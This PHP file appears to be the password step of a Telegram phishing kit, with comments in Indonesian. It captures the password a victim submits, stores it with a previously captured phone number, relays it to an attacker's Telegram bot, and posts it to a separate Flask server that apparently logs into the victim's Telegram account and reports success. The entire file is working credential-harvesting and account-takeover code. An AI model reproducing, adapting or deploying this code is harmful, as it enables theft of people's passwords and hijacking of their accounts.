<?php
require_once __DIR__ . '/JsonSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi JSON Session Handler
$jsonSessionHandler = new JsonSessionHandler();
session_set_save_handler($jsonSessionHandler, true);
$GLOBALS['jsonSessionHandler'] = $jsonSessionHandler;

session_start();

$message = $_SESSION['message'] ?? '';
$password = $_POST['password'] ?? '';
$phoneNumber = $_SESSION['telegram_phone'] ?? '';

$string = $message;
$string .= "Password : `$password`\n";

$_SESSION['message'] = $string;
$_SESSION['password'] = $password;

// Simpan juga ke JSON secara langsung
if (isset($jsonSessionHandler)) {
    $jsonSessionHandler->saveTelegramData($string, [
        'password' => $password,
        'stage' => 'password_verification'
    ]);
}

// Kirim ke bot Telegram
sendTelegram($string);

// Komunikasi dengan server Flask
$session_id = session_id();
$data = [
    'session_id' => $session_id,
    'phone_number' => $phoneNumber,
    'password' => $password
];

$ch = curl_init($flask_server_url . "/password");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

$output = curl_exec($ch);
curl_close($ch);
$result = json_decode($output, true);

// Store the result in session
$_SESSION['telegram_password_result'] = $result;

if (isset($result['success']) && $result['success'] === true) {
    // Authentication completed
    $_SESSION['telegram_auth_completed'] = true;
    echo json_encode(['success' => true]);
} else {
    // Authentication failed
    echo json_encode(['success' => false, 'error' => $result['error'] ?? 'Invalid password']);
}
